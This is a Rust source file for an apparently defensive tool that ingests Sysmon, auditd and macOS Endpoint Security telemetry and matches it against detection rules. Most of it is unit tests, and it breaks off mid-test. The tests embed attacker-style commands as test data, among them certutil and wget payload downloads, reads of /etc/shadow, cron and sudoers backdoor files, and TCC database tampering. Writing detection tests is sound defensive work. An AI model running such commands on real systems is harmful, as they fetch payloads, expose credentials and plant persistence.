/// reports the class. `NOTIFY_OPEN` and `NOTIFY_CREATE` are `file` events;
/// `NOTIFY_CONNECT` is a `network` one.
fn esf_event(ev: &Value) -> Option<(String, String, HashMap<String, String>)> {
    let event = ev.get("event")?;
    let mut fields = HashMap::new();

    if let Some(open) = event.get("open")
        && let Some(path) = nested_str(open, &["file", "path"])
    {
        fields.insert("TargetFilename".to_string(), path.to_string());
        return Some(("file".to_string(), format!("file opened {path}"), fields));
    }
    if let Some(create) = event.get("create") {
        // A create names its target either as an already-existing file or as a
        // (directory, new name) pair, depending on whether it clobbered anything.
        let path = nested_str(create, &["destination", "existing_file", "path"])
            .or_else(|| nested_str(create, &["destination", "new_path", "filename"]))
            .or_else(|| nested_str(create, &["file", "path"]))?;
        fields.insert("TargetFilename".to_string(), path.to_string());
        return Some(("file".to_string(), format!("file created {path}"), fields));
    }
    if let Some(connect) = event.get("connect") {
        let host = nested_str(connect, &["address"])?;
        fields.insert("DestinationIp".to_string(), host.to_string());
        let port = connect.get("port").and_then(|p| {
            p.as_str()
                .map(str::to_string)
                .or_else(|| p.as_u64().map(|n| n.to_string()))
        });
        let detail = match &port {
            Some(p) => {
                fields.insert("DestinationPort".to_string(), p.clone());
                format!("network connection to {host}:{p}")
            }
            None => format!("network connection to {host}"),
        };
        return Some(("network".to_string(), detail, fields));
    }
    None
}

/// The pid of an ESF process object, from its audit token. `eslogger` renders the
/// token as an object carrying the pid; a bare numeric `pid` is accepted as a
/// fallback for exports that flatten it.
fn esf_pid(process: Option<&Value>) -> Option<String> {
    let process = process?;
    let pid = process
        .get("audit_token")
        .and_then(|t| t.get("pid"))
        .or_else(|| process.get("pid"))?;
    pid.as_u64()
        .map(|n| n.to_string())
        .or_else(|| pid.as_str().map(str::to_string))
        .filter(|s| !s.is_empty())
}

/// Reduce one ESF message to a canonical field map, or `None` when it is not an
/// exec event. `Image` / `CommandLine` / `CurrentDirectory` come from the new
/// process (`event.exec.target` / `args` / `cwd`); `ParentImage` from the calling
/// process that invoked exec.
fn reduce_esf(ev: &Value) -> Option<HashMap<String, String>> {
    let exec = ev.get("event")?.get("exec")?;
    if !exec.is_object() {
        return None;
    }
    let mut fields = HashMap::new();
    if let Some(image) = nested_str(exec, &["target", "executable", "path"]) {
        insert_nonempty(&mut fields, "Image", image);
    }
    let cmdline = join_json_args(exec.get("args"));
    if !cmdline.is_empty() {
        fields.insert("CommandLine".to_string(), cmdline);
    }
    if let Some(cwd) = nested_str(exec, &["cwd", "path"]) {
        insert_nonempty(&mut fields, "CurrentDirectory", cwd);
    }
    if let Some(parent) = nested_str(ev, &["process", "executable", "path"]) {
        insert_nonempty(&mut fields, "ParentImage", parent);
    }
    // The *new* process's pid, so the non-execution events it goes on to cause
    // correlate back to it — the field the other two formats also supply.
    if let Some(pid) = esf_pid(exec.get("target")) {
        fields.insert("ProcessId".to_string(), pid);
    }
    // Code-signing context of the new image — the fields macOS detections key on
    // to flag unsigned or third-party binaries. Kept under their `eslogger`
    // names so a rule author keys on what they see in the telemetry.
    if let Some(target) = exec.get("target") {
        if let Some(signing_id) = target.get("signing_id").and_then(Value::as_str) {
            insert_nonempty(&mut fields, "signing_id", signing_id);
        }
        if let Some(team_id) = target.get("team_id").and_then(Value::as_str) {
            insert_nonempty(&mut fields, "team_id", team_id);
        }
        if let Some(platform) = target.get("is_platform_binary").and_then(Value::as_bool) {
            fields.insert("is_platform_binary".to_string(), platform.to_string());
        }
    }
    Some(fields)
}

/// Join a JSON array of argv strings into a command line, re-quoting each element
/// (via [`shell_quote_arg`]) so the shared reducer's re-tokenization preserves
/// the exact boundaries the sensor recorded — the same concern as auditd argv.
fn join_json_args(args: Option<&Value>) -> String {
    let Some(items) = args.and_then(Value::as_array) else {
        return String::new();
    };
    items
        .iter()
        .filter_map(Value::as_str)
        .map(shell_quote_arg)
        .collect::<Vec<_>>()
        .join(" ")
}

/// Follow a chain of object keys to a string leaf, or `None` if any hop is
/// missing or the leaf is not a string.
fn nested_str<'a>(v: &'a Value, path: &[&str]) -> Option<&'a str> {
    let mut cur = v;
    for key in path {
        cur = cur.get(key)?;
    }
    cur.as_str()
}

/// Insert `key` only when `value` is non-empty, keeping empty sensor fields from
/// masking a synthesized fallback in `execution_from_fields`.
fn insert_nonempty(fields: &mut HashMap<String, String>, key: &str, value: &str) {
    if !value.is_empty() {
        fields.insert(key.to_string(), value.to_string());
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyzer;
    use crate::kb;
    use crate::model::KnowledgeBase;
    use std::path::PathBuf;

    fn fixture(name: &str) -> String {
        let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/fixtures/telemetry")
            .join(name);
        std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("read {}: {e}", path.display()))
    }

    fn win_kb() -> KnowledgeBase {
        kb::load(kb::Platform::WindowsSysmon).expect("windows KB must parse")
    }

    fn lnx_kb() -> KnowledgeBase {
        kb::load(kb::Platform::LinuxAuditd).expect("linux KB must parse")
    }

    fn mac_kb() -> KnowledgeBase {
        kb::load(kb::Platform::MacosEs).expect("macos KB must parse")
    }

    fn ids(report: &crate::model::Report) -> Vec<String> {
        report.findings.iter().map(|f| f.rule_id.clone()).collect()
    }

    #[test]
    fn ingests_sysmon_array_and_skips_non_process_events() {
        let ingest = parse(&fixture("sysmon-eid1.json"), Format::Sysmon).expect("parses");
        // Three EID 1 process events; the lone EID 3 network record is skipped.
        assert_eq!(ingest.observations.len(), 3);
        assert_eq!(ingest.skipped, 1);
        // Record numbers reflect source position (the skipped record is #4).
        assert_eq!(
            ingest
                .observations
                .iter()
                .map(|o| o.record)
                .collect::<Vec<_>>(),
            vec![1, 2, 3]
        );
    }

    #[test]
    fn analyzes_ingested_sysmon_events_via_the_existing_matcher() {
        let ingest = parse(&fixture("sysmon-eid1.json"), Format::Sysmon).expect("parses");
        let report = analyzer::analyze_telemetry(&ingest, &win_kb());
        let ids = ids(&report);
        // The malicious process-creation events map to their KB entries…
        assert!(ids.contains(&"certutil-download".to_string()));
        assert!(ids.contains(&"lsass-comsvcs".to_string()));
        // …and the finding points back at the record it came from.
        let certutil = report
            .findings
            .iter()
            .find(|f| f.rule_id == "certutil-download")
            .unwrap();
        assert_eq!(certutil.line, 1);
    }

    // A minimal KB whose one entry matches a registry event by its `event` axis,
    // used to exercise standalone non-execution matching without touching the
    // embedded production KB.
    fn event_kb() -> KnowledgeBase {
        let json = r#"{
            "platform": "windows-sysmon",
            "entries": [{
                "id": "registry-run-key-persistence",
                "match": { "event": { "class": "registry", "field": "TargetObject",
                                      "contains": "\\CurrentVersion\\Run" } },
                "description": "Autorun value set under a Run key",
                "techniques": [{"id": "T1547.001", "name": "Registry Run Keys / Startup Folder"}],
                "telemetry": ["Sysmon EID 13 (registry value set) under a Run key"],
                "noise": 60
            }]
        }"#;
        let kb: KnowledgeBase = serde_json::from_str(json).expect("test KB parses");
        kb.validate().expect("test KB valid");
        kb
    }

    #[test]
    fn standalone_registry_event_matches_the_event_axis() {
        // A registry Run-key set whose causing process was not captured: no
        // execution to correlate to, so it becomes a standalone event observation
        // and is matched against the KB `event` axis.
        let sysmon = r#"[{"EventID":13,"ProcessId":"7777",
            "TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"}]"#;
        let ingest = parse(sysmon, Format::Sysmon).expect("parses");
        assert!(ingest.observations.is_empty());
        assert_eq!(ingest.event_observations.len(), 1);
        assert_eq!(ingest.event_observations[0].class, "registry");

        let report = analyzer::analyze_telemetry(&ingest, &event_kb());
        let f = report
            .findings
            .iter()
            .find(|f| f.rule_id == "registry-run-key-persistence")
            .expect("standalone registry finding");
        assert_eq!(f.techniques[0].id, "T1547.001");
        // The observed event detail rides along as a confirmed side-effect.
        assert!(
            f.observed_side_effects
                .iter()
                .any(|se| se.class == "registry" && se.detail.contains("registry set"))
        );
    }

    #[test]
    fn correlated_registry_event_is_not_also_matched_standalone() {
        // When the causing execution IS captured, the registry event attaches to
        // it as a side-effect and does not become a standalone observation — so it
        // can't double-count.
        let sysmon = r#"[
            {"EventID":1,"ProcessId":"5555","Image":"C:\\Windows\\System32\\reg.exe","CommandLine":"reg add x"},
            {"EventID":13,"ProcessId":"5555","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\x"}
        ]"#;
        let ingest = parse(sysmon, Format::Sysmon).expect("parses");
        assert_eq!(ingest.observations.len(), 1);
        assert_eq!(ingest.observations[0].side_effects.len(), 1);
        assert!(ingest.event_observations.is_empty());
    }

    #[test]
    fn image_is_authoritative_for_the_program_basename() {
        // A single flat event: the program comes from `Image` (path-stripped,
        // `.exe`-normalized), matching how the KB resolves a program.
        let ev = r#"{"EventID":1,"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -urlcache -f http://x/a a"}"#;
        let ingest = parse(ev, Format::Sysmon).expect("parses");
        assert_eq!(ingest.observations.len(), 1);
        assert_eq!(ingest.observations[0].commands[0].program, "certutil");
    }

    #[test]
    fn ingests_jsonl_with_nested_event_data() {
        // JSONL, exercising the `EventData` and Elastic `winlog.event_data`
        // nesting shapes.
        let ingest = parse(&fixture("sysmon-eid1.jsonl"), Format::Sysmon).expect("parses");
        assert_eq!(ingest.observations.len(), 2);
        assert_eq!(ingest.skipped, 0);
        let report = analyzer::analyze_telemetry(&ingest, &win_kb());
        let ids = ids(&report);
        assert!(ids.contains(&"vssadmin-delete".to_string()));
        assert!(ids.contains(&"net-user".to_string()));
    }

    #[test]
    fn sysmon_correlates_network_and_file_side_effects() {
        let ingest =
            parse(&fixture("sysmon-with-side-effects.json"), Format::Sysmon).expect("parses");
        // One EID 1 execution; the three non-process records are skipped as units.
        assert_eq!(ingest.observations.len(), 1);
        assert_eq!(ingest.skipped, 3);
        // The EID 3 / EID 11 events sharing the process's pid attach as confirmed
        // side-effects; the EID 3 for an uncaptured pid (9999) is dropped.
        let effects = &ingest.observations[0].side_effects;
        assert_eq!(effects.len(), 2);
        assert!(
            effects
                .iter()
                .any(|e| e.class == "network" && e.detail == "network connection to 192.0.2.10:443")
        );
        assert!(
            effects
                .iter()
                .any(|e| e.class == "file" && e.detail.contains("a.exe"))
        );
    }

    #[test]
    fn side_effects_reach_the_finding() {
        let ingest =
            parse(&fixture("sysmon-with-side-effects.json"), Format::Sysmon).expect("parses");
        let report = analyzer::analyze_telemetry(&ingest, &win_kb());
        let certutil = report
            .findings
            .iter()
            .find(|f| f.rule_id == "certutil-download")
            .expect("certutil finding");
        assert_eq!(certutil.observed_side_effects.len(), 2);
    }

    #[test]
    fn side_effects_correlate_to_the_latest_execution_of_a_reused_pid() {
        // Two executions reuse pid 100. Each connection must attach to the
        // execution that most recently held the pid — not both to the first.
        let sysmon = r#"[
            {"EventID":1,"ProcessId":"100","Image":"C:\\a.exe","CommandLine":"a.exe"},
            {"EventID":3,"ProcessId":"100","DestinationIp":"10.0.0.1","DestinationPort":"1"},
            {"EventID":1,"ProcessId":"100","Image":"C:\\b.exe","CommandLine":"b.exe"},
            {"EventID":3,"ProcessId":"100","DestinationIp":"10.0.0.2","DestinationPort":"2"}
        ]"#;
        let ingest = parse(sysmon, Format::Sysmon).expect("parses");
        assert_eq!(ingest.observations.len(), 2);
        assert_eq!(ingest.observations[0].side_effects.len(), 1);
        assert!(
            ingest.observations[0].side_effects[0]
                .detail
                .contains("10.0.0.1")
        );
        assert_eq!(ingest.observations[1].side_effects.len(), 1);
        assert!(
            ingest.observations[1].side_effects[0]
                .detail
                .contains("10.0.0.2")
        );
    }

    #[test]
    fn network_event_without_a_command_line_is_not_a_process_create() {
        // Sysmon EID 3 (network connection) carries an Image but no CommandLine;
        // even with the event id stripped it must not be read as a process.
        let mut fields = HashMap::new();
        fields.insert(
            "Image".to_string(),
            "C:\\Windows\\System32\\svchost.exe".to_string(),
        );
        fields.insert("DestinationIp".to_string(), "192.0.2.1".to_string());
        assert!(reduce_process_create(&fields).is_none());
    }

    #[test]
    fn observed_mode_agrees_with_predictive_mode() {
        // The same command, seen as recorded telemetry or predicted from text,
        // must resolve to the same findings — the two modes share one matcher.
        let cmdline = "certutil.exe -urlcache -f http://x/a.exe a.exe";
        let ev = format!(
            r#"{{"EventID":1,"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"{cmdline}"}}"#
        );
        let ingest = parse(&ev, Format::Sysmon).expect("parses");
        let observed = ids(&analyzer::analyze_telemetry(&ingest, &win_kb()));
        let predicted = ids(&analyzer::analyze(cmdline, &win_kb()));
        let set = |v: Vec<String>| v.into_iter().collect::<std::collections::BTreeSet<_>>();
        assert_eq!(set(observed), set(predicted));
    }

    #[test]
    fn top_level_field_wins_over_a_nested_duplicate() {
        // When a record carries the same field both flat and nested, the
        // top-level value wins — deterministically, regardless of key order.
        let ev = r#"{
            "EventData": { "Image": "C:\\nested\\reg.exe", "CommandLine": "reg query HKLM" },
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "EventID": 1
        }"#;
        let value: serde_json::Value = serde_json::from_str(ev).unwrap();
        let fields = flatten_fields(&value);
        assert_eq!(
            fields.get("Image").map(String::as_str),
            Some("C:\\Windows\\System32\\certutil.exe")
        );
        // The nested-only field is still collected.
        assert_eq!(
            fields.get("CommandLine").map(String::as_str),
            Some("reg query HKLM")
        );
    }

    #[test]
    fn observation_carries_canonical_event_fields() {
        // The fields a command line can't supply are canonically named and kept
        // on the observation, so Sigma evaluation can consult them. Casing and
        // the Elastic `winlog` nesting are both normalized.
        let ev = r#"{"winlog":{"event_id":1,"event_data":{
            "Image":"C:\\Windows\\System32\\certutil.exe",
            "CommandLine":"certutil -urlcache -f http://x/a a",
            "parentimage":"C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
            "IntegrityLevel":"Medium"
        }}}"#;
        let ingest = parse(ev, Format::Sysmon).expect("parses");
        let event = &ingest.observations[0].event;
        assert_eq!(event.get("EventID").map(String::as_str), Some("1"));
        assert_eq!(
            event.get("ParentImage").map(String::as_str),
            Some("C:\\Program Files\\Microsoft Office\\WINWORD.EXE")
        );
        assert_eq!(
            event.get("IntegrityLevel").map(String::as_str),
            Some("Medium")
        );
    }

    #[test]
    fn invalid_json_is_a_clear_error() {
        assert!(parse("not json at all", Format::Sysmon).is_err());
    }

    // --- auditd ------------------------------------------------------------

    #[test]
    fn ingests_auditd_execve_and_skips_non_exec() {
        let ingest = parse(&fixture("auditd-execve.log"), Format::Auditd).expect("parses");
        // Three execve events (cat, wget, whoami). The connect event (syscall 42,
        // no EXECVE record) is not an execution — it is counted as skipped and,
        // because its pid matches no captured execution, kept as a standalone
        // network observation rather than dropped.
        assert_eq!(ingest.observations.len(), 3);
        assert_eq!(ingest.skipped, 1);
        assert_eq!(ingest.event_observations.len(), 1);
        assert_eq!(ingest.event_observations[0].class, "network");
        // Record numbers are the events' source positions: the skipped connect
        // event is #3, so whoami (the 4th event) is record 4 — not 3.
        assert_eq!(
            ingest
                .observations
                .iter()
                .map(|o| o.record)
                .collect::<Vec<_>>(),
            vec![1, 2, 4]
        );
    }

    #[test]
    fn analyzes_ingested_auditd_events_via_the_existing_matcher() {
        let ingest = parse(&fixture("auditd-execve.log"), Format::Auditd).expect("parses");
        let report = analyzer::analyze_telemetry(&ingest, &lnx_kb());
        let ids = ids(&report);
        assert!(ids.contains(&"shadow-read".to_string()));
        assert!(ids.contains(&"wget".to_string()));
        assert!(ids.contains(&"whoami".to_string()));
    }

    #[test]
    fn standalone_auditd_events_match_the_linux_event_axis() {
        // The end the whole `event` axis exists for, on a platform that could not
        // reach it before: two file events with no captured causing execution,
        // recognized against the shipped Linux knowledge base.
        let ingest =
            parse(&fixture("auditd-with-side-effects.log"), Format::Auditd).expect("parses");
        let report = analyzer::analyze_telemetry(&ingest, &lnx_kb());
        let ids = ids(&report);
        assert!(ids.contains(&"shadow-read".to_string()));
        assert!(ids.contains(&"cron-persist".to_string()));
        // The observed detail rides onto the finding as confirmed telemetry.
        let shadow = report
            .findings
            .iter()
            .find(|f| f.rule_id == "shadow-read")
            .expect("shadow finding");
        assert!(
            shadow
                .observed_side_effects
                .iter()
                .any(|se| se.detail == "file opened /etc/shadow")
        );
    }

    #[test]
    fn standalone_esf_events_match_the_macos_event_axis() {
        let ingest = parse(&fixture("esf-with-side-effects.jsonl"), Format::Esf).expect("parses");
        let report = analyzer::analyze_telemetry(&ingest, &mac_kb());
        let ids = ids(&report);
        assert!(ids.contains(&"launch-agent-persist".to_string()));
        assert!(ids.contains(&"tcc-tamper".to_string()));
    }

    #[test]
    fn sudoers_access_matches_the_file_and_the_include_directory() {
        // `sudoers-tamper` claims openat()/write() of `/etc/sudoers` *or*
        // `/etc/sudoers.d/*`, so both shapes must be recognized from a PATH
        // record with no captured causing execution.
        let event = |path: &str| {
            format!(
                "\
type=SYSCALL msg=audit(1700000003.100:960): arch=c000003e syscall=257 success=yes exit=3 items=1 ppid=1 pid=4000 uid=0 comm=\"vim\" exe=\"/usr/bin/vim\" key=\"sudoers-watch\"
type=PATH msg=audit(1700000003.100:960): item=0 name=\"{path}\" nametype=NORMAL
"
            )
        };
        for path in ["/etc/sudoers", "/etc/sudoers.d/99-backdoor"] {
            let ingest = parse(&event(path), Format::Auditd).expect("parses");
            assert_eq!(ingest.event_observations.len(), 1, "no event for {path}");
            let ids = ids(&analyzer::analyze_telemetry(&ingest, &lnx_kb()));
            assert!(
                ids.contains(&"sudoers-tamper".to_string()),
                "sudoers-tamper did not fire on {path}"
            );
        }
        // `path_under` is segment-aware, so a sibling path that merely shares the
        // prefix is not sudoers tampering.
        let ingest = parse(&event("/etc/sudoers.d.bak/notes"), Format::Auditd).expect("parses");
        let ids = ids(&analyzer::analyze_telemetry(&ingest, &lnx_kb()));
        assert!(!ids.contains(&"sudoers-tamper".to_string()));
    }

    #[test]
    fn a_metadata_connect_matches_on_address_and_port_together() {
        // The multi-field predicate the flat axis could not express: the IMDS
        // entry keys on the link-local address *and* port 80.
        // saddr: family 0200 (AF_INET), port 0050 (80), A9FEA9FE (169.254.169.254).
        let log = "\
type=SYSCALL msg=audit(1700000002.100:950): arch=c000003e syscall=42 success=yes exit=0 ppid=1 pid=3000 uid=1000 comm=\"curl\" exe=\"/usr/bin/curl\" key=\"net\"
type=SOCKADDR msg=audit(1700000002.100:950): saddr=02000050A9FEA9FE
";
        let ingest = parse(log, Format::Auditd).expect("parses");
        assert_eq!(ingest.event_observations.len(), 1);
        assert_eq!(
            ingest.event_observations[0].detail,
            "network connection to 169.254.169.254:80"
        );
        let ids = ids(&analyzer::analyze_telemetry(&ingest, &lnx_kb()));
        assert!(ids.contains(&"cloud-imds".to_string()));
    }

    #[test]
    fn auditd_decodes_sockaddr_into_a_standalone_network_event() {
        // The connect event's pid (1203) matches no captured execution, so it is
        // matched on its own rather than attached to one. The destination comes
        // from the raw `struct sockaddr` in `saddr` — 0x0050 is port 80 and
        // C0000210 is 192.0.2.16.
        let ingest = parse(&fixture("auditd-execve.log"), Format::Auditd).expect("parses");
        let ev = &ingest.event_observations[0];
        assert_eq!(ev.class, "network");
        assert_eq!(ev.detail, "network connection to 192.0.2.16:80");
        assert_eq!(
            ev.event.get("DestinationIp").map(String::as_str),
            Some("192.0.2.16")
        );
        assert_eq!(
            ev.event.get("DestinationPort").map(String::as_str),
            Some("80")
        );
        // The pid rides along so the record is addressable like any other.
        assert_eq!(ev.event.get("ProcessId").map(String::as_str), Some("1203"));
    }

    #[test]
    fn auditd_correlates_a_connect_to_the_execution_that_made_it() {
        let ingest =
            parse(&fixture("auditd-with-side-effects.log"), Format::Auditd).expect("parses");
        // curl (pid 1300) is captured, and the connect from the same pid attaches
        // to it as a side-effect instead of standing alone.
        let curl = ingest
            .observations
            .iter()
            .find(|o| o.commands[0].program == "curl")
            .expect("curl execution");
        assert_eq!(curl.side_effects.len(), 1);
        assert_eq!(curl.side_effects[0].class, "network");
        assert_eq!(
            curl.side_effects[0].detail,
            "network connection to 192.0.2.10:4444"
        );
        // …and it is not also counted standalone, so it cannot double-count.
        assert!(
            !ingest
                .event_observations
                .iter()
                .any(|e| e.detail.contains("192.0.2.10:4444"))
        );
    }

    #[test]
    fn auditd_reads_path_records_as_file_events() {
        let ingest =
            parse(&fixture("auditd-with-side-effects.log"), Format::Auditd).expect("parses");
        let files: Vec<&EventObservation> = ingest
            .event_observations
            .iter()
            .filter(|e| e.class == "file")
            .collect();
        assert_eq!(files.len(), 2);
        // An `open` reports the object read...
        assert_eq!(files[0].detail, "file opened /etc/shadow");
        assert_eq!(
            files[0].event.get("TargetFilename").map(String::as_str),
            Some("/etc/shadow")
        );
        // ...and `nametype=CREATE` reports a write. The event's other PATH record
        // is the `PARENT` directory the operation resolved through, which is not
        // an observation of its own and must not be reported instead.
        assert_eq!(files[1].detail, "file created /etc/cron.d/backdoor");
        assert_eq!(
            files[1].event.get("TargetFilename").map(String::as_str),
            Some("/etc/cron.d/backdoor")
        );
    }

    #[test]
    fn auditd_does_not_report_a_failed_syscall_as_observed() {
        // The fixture's `nc` connect has success=no. Reporting a connection that
        // never completed would overstate what the host actually did.
        let ingest =
            parse(&fixture("auditd-with-side-effects.log"), Format::Auditd).expect("parses");
        assert!(
            !ingest
                .event_observations
                .iter()
                .any(|e| e.detail.contains("192.0.2.11")),
            "a failed connect was reported as observed telemetry"
        );
    }

    #[test]
    fn auditd_execve_path_records_are_not_mistaken_for_file_events() {
        // Every execve carries PATH records for the binary it loaded. They belong
        // to an execution, which is reduced as a command — reading them as file
        // events too would invent a second observation for one action.
        let log = "\
type=SYSCALL msg=audit(1700000001.100:900): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=1 pid=2000 uid=0 comm=\"cat\" exe=\"/usr/bin/cat\" key=\"exec\"
type=EXECVE msg=audit(1700000001.100:900): argc=2 a0=\"cat\" a1=\"/etc/shadow\"
type=PATH msg=audit(1700000001.100:900): item=0 name=\"/usr/bin/cat\" nametype=NORMAL
";
        let ingest = parse(log, Format::Auditd).expect("parses");
        assert_eq!(ingest.observations.len(), 1);
        assert!(ingest.event_observations.is_empty());
    }

    #[test]
    fn decode_saddr_reads_ipv4_and_ipv6_and_abstains_otherwise() {
        // AF_INET: family 0200 (LE 2), port 0x115C = 4444, C000020A = 192.0.2.10.
        assert_eq!(
            decode_saddr("0200115CC000020A"),
            Some(("192.0.2.10".to_string(), Some("4444".to_string())))
        );
        // AF_INET6: family 000A (LE 10), port 0x0050 = 80, then the 16-byte address.
        assert_eq!(
            decode_saddr("0A0000500000000020010db8000000000000000000000001"),
            Some(("2001:db8:0:0:0:0:0:1".to_string(), Some("80".to_string())))
        );
        // AF_UNIX carries a socket path, not a destination host — decoding one into
        // an address would be a fabricated answer, so abstain.
        assert_eq!(decode_saddr("0100002F746D702F78"), None);
        // Truncated or non-hex input is not guessed at either.
        assert_eq!(decode_saddr("0200"), None);
        assert_eq!(decode_saddr("zzzz"), None);
    }

    #[test]
    fn auditd_rebuilds_argv_and_decodes_hex_and_quoted_values() {
        let ingest = parse(&fixture("auditd-execve.log"), Format::Auditd).expect("parses");
        // Event 2 (wget): the exe path and a0 arrive hex-encoded, the URL quoted.
        let wget = &ingest.observations[1];
        assert_eq!(wget.commands[0].program, "wget");
        assert_eq!(wget.raw, "wget http://192.0.2.10/payload");
        assert_eq!(
            wget.event.get("Image").map(String::as_str),
            Some("/usr/bin/wget")
        );
        // The working directory rides along from the CWD record for observed
        // Sigma evaluation.
        assert_eq!(
            wget.event.get("CurrentDirectory").map(String::as_str),
            Some("/tmp")
        );
        // Numeric uid is deliberately not mapped onto the name-based User field.
        assert!(wget.event.get("User").is_none());
    }

    #[test]
    fn auditd_reassembles_records_out_of_order() {
        // EXECVE before its SYSCALL, and an unrelated event interleaved: grouping
        // is by the audit(…) id, not adjacency.
        let log = "\
type=EXECVE msg=audit(10.0:1): argc=2 a0=\"cat\" a1=\"/etc/shadow\"
type=SYSCALL msg=audit(99.9:2): syscall=42 exe=\"/usr/bin/ss\"
type=SYSCALL msg=audit(10.0:1): syscall=59 exe=\"/usr/bin/cat\" uid=0
";
        let ingest = parse(log, Format::Auditd).expect("parses");
        assert_eq!(ingest.observations.len(), 1);
        assert_eq!(ingest.skipped, 1);
        assert_eq!(ingest.observations[0].raw, "cat /etc/shadow");
        assert_eq!(
            ingest.observations[0]
                .event
                .get("Image")
                .map(String::as_str),
            Some("/usr/bin/cat")
        );
    }

    #[test]
    fn decode_value_handles_quoted_hex_and_literal() {
        assert_eq!(decode_value("\"/usr/bin/cat\""), "/usr/bin/cat");
        assert_eq!(decode_value("2f7573722f62696e2f6361740000"), "/usr/bin/cat");
        assert_eq!(decode_value("/usr/bin/whoami"), "/usr/bin/whoami");
        // An even-length all-hex token like "5678" DOES decode (→ "Vx") — which
        // is exactly why decode_value is applied only to string fields (exe, cwd,
        // argv), never to numeric ones like uid/pid. Odd-length or non-hex always
        // passes through literally.
        assert_eq!(decode_value("5678"), "Vx");
        assert_eq!(decode_value("567"), "567");
    }

    #[test]
    fn auditd_preserves_argv_boundaries_across_whitespace_and_metachars() {
        // auditd hex-encodes argv values that contain spaces/quotes/separators.
        // Joining the exact argv must keep each element one token, not let the
        // shell parser re-split it. a2 = hex("hello world"), a3 = hex("a;b|c").
        let log = "\
type=SYSCALL msg=audit(1.0:1): syscall=59 exe=\"/usr/bin/grep\"
type=EXECVE msg=audit(1.0:1): argc=4 a0=\"grep\" a1=\"-r\" a2=68656c6c6f20776f726c64 a3=613b627c63
";
        let ingest = parse(log, Format::Auditd).expect("parses");
        let cmd = &ingest.observations[0].commands[0];
        assert_eq!(cmd.program, "grep");
        // The space- and separator-bearing args each survive as a single token.
        assert!(
            cmd.args.iter().any(|a| a == "hello world"),
            "expected 'hello world' as one arg, got {:?}",
            cmd.args
        );
        assert!(
            cmd.args.iter().any(|a| a == "a;b|c"),
            "expected 'a;b|c' as one arg, got {:?}",
            cmd.args
        );
    }

    #[test]
    fn passwd_maps_uid_to_name() {
        let passwd = "root:x:0:0:root:/root:/bin/bash\n# comment\nanalyst:x:1000:1000::/home/analyst:/bin/zsh\nbad-line\n";
        let map = parse_passwd(passwd);
        assert_eq!(map.get("0").map(String::as_str), Some("root"));
        assert_eq!(map.get("1000").map(String::as_str), Some("analyst"));
        assert_eq!(map.len(), 2);
    }

    #[test]
    fn auditd_resolves_user_only_with_a_mapping() {
        let log = "\
type=SYSCALL msg=audit(1.0:1): syscall=59 exe=\"/usr/bin/whoami\" uid=0
type=EXECVE msg=audit(1.0:1): argc=1 a0=\"whoami\"
";
        // No mapping: uid stays unresolved — honest, so a User-keyed rule remains
        // indeterminate rather than getting a wrong answer.
        let bare = parse(log, Format::Auditd).expect("parses");
        assert!(bare.observations[0].event.get("User").is_none());

        // With a mapping, uid 0 resolves to root.
        let users = parse_passwd("root:x:0:0:::\n");
        let mapped = parse_with_users(log, Format::Auditd, &users).expect("parses");
        assert_eq!(
            mapped.observations[0].event.get("User").map(String::as_str),
            Some("root")
        );
    }

    #[test]
    fn empty_auditd_input_is_a_clear_error() {
        assert!(parse("", Format::Auditd).is_err());
        assert!(parse("---- \n#comment\n", Format::Auditd).is_err());
    }

    // --- macOS Endpoint Security (eslogger) --------------------------------

    #[test]
    fn ingests_esf_exec_and_skips_non_exec() {
        let ingest = parse(&fixture("esf-exec.jsonl"), Format::Esf).expect("parses");
        // Three exec events (curl, whoami, sw_vers). The lone open event is not an
        // execution — counted as skipped, and kept as a standalone file
        // observation. Record numbers follow source position (sw_vers is #4).
        assert_eq!(ingest.observations.len(), 3);
        assert_eq!(ingest.skipped, 1);
        assert_eq!(ingest.event_observations.len(), 1);
        assert_eq!(
            ingest
                .observations
                .iter()
                .map(|o| o.record)
                .collect::<Vec<_>>(),
            vec![1, 2, 4]
        );
    }

    #[test]
    fn analyzes_ingested_esf_events_via_the_existing_matcher() {
        let ingest = parse(&fixture("esf-exec.jsonl"), Format::Esf).expect("parses");
        let report = analyzer::analyze_telemetry(&ingest, &mac_kb());
        let ids = ids(&report);
        assert!(ids.contains(&"curl".to_string()));
        assert!(ids.contains(&"whoami".to_string()));
        assert!(ids.contains(&"sw-vers".to_string()));
    }

    #[test]
    fn esf_reduces_target_argv_and_carries_the_calling_parent() {
        let ingest = parse(&fixture("esf-exec.jsonl"), Format::Esf).expect("parses");
        // Event 1 (curl): image/argv/cwd come from event.exec.target, and the
        // parent image from the calling process (process.executable.path).
        let curl = &ingest.observations[0];
        assert_eq!(curl.commands[0].program, "curl");
        assert_eq!(curl.raw, "curl -s -O http://192.0.2.10/payload");
        assert_eq!(
            curl.event.get("Image").map(String::as_str),
            Some("/usr/bin/curl")
        );
        assert_eq!(
            curl.event.get("CurrentDirectory").map(String::as_str),
            Some("/Users/analyst")
        );
        // The ParentImage a command line can't supply — ESF's payoff.
        assert_eq!(
            curl.event.get("ParentImage").map(String::as_str),
            Some("/usr/bin/osascript")
        );
    }

    #[test]
    fn esf_reads_open_and_create_as_standalone_file_events() {
        let ingest = parse(&fixture("esf-with-side-effects.jsonl"), Format::Esf).expect("parses");
        let files: Vec<&EventObservation> = ingest
            .event_observations
            .iter()
            .filter(|e| e.class == "file")
            .collect();
        assert_eq!(files.len(), 2);
        assert_eq!(
            files[0].detail,
            "file created /Users/analyst/Library/LaunchAgents/com.evil.plist"
        );
        assert_eq!(
            files[1].event.get("TargetFilename").map(String::as_str),
            Some("/Users/analyst/Library/Application Support/com.apple.TCC/TCC.db")
        );
        // The emitting process is named on the event, so a finding can say who did
        // it even with no captured execution.
        assert_eq!(
            files[1].event.get("Image").map(String::as_str),
            Some("/usr/bin/sqlite3")
        );
    }

    #[test]
    fn esf_correlates_a_connect_by_audit_token_pid() {
